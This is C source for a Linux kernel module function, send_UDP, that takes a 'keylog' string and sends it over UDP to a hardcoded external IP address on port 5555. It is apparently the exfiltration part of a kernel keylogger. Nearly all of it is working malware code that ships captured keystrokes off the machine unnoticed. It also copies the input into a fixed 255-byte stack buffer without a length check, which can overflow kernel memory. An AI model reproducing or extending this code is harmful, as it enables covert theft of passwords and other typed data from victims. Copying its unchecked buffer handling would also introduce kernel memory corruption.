#include <linux/module.h>
#include <linux/init.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <net/sock.h>

#include "send_UDP.h"

#define SERVERPORT 5555
static struct socket *clientsocket=NULL;

void send_UDP(char *keylog)
{
  int len;
  char buf[255];
  struct msghdr msg;
  struct iovec iov;
  mm_segment_t oldfs;
  struct sockaddr_in to;
  printk(KERN_ERR "sendthread initialized\n");
  if( sock_create( PF_INET,SOCK_DGRAM,IPPROTO_UDP,&clientsocket)<0 ){
    printk( KERN_ERR "server: Error creating clientsocket.n" );
    //return -EIO;
   }
  memset(&to,0, sizeof(to));
  to.sin_family = AF_INET;
  to.sin_addr.s_addr = in_aton( "140.138.152.18" );  
      /* destination address */
  to.sin_port = htons( (unsigned short)
      SERVERPORT );
  memset(&msg,0,sizeof(msg));
  msg.msg_name = &to;
  msg.msg_namelen = sizeof(to);
  memcpy(buf, keylog, strlen(keylog)+1);
  iov.iov_base = buf;
  iov.iov_len  = strlen(keylog)+1;
  msg.msg_control = NULL;
  msg.msg_controllen = 0;
  msg.msg_iov    = &iov;
  msg.msg_iovlen = 1;
  // msg.msg_flags    = MSG_NOSIGNAL;
  printk(KERN_ERR " vor send\n");
  oldfs = get_fs();
  set_fs( KERNEL_DS );
  len = sock_sendmsg( clientsocket, &msg, strlen(keylog)+1);
  //len = sock_sendmsg( clientsocket, &msg, size );
  //len = sock_sendmsg( clientsocket, &msg, size );
  //len = sock_sendmsg( clientsocket, &msg, size );
  set_fs( oldfs );
  printk( KERN_ERR "sock_sendmsg returned: %d\n", len);
  //return 0;
}

void disable_udp( void )
{
  if( clientsocket )
    sock_release( clientsocket );
}


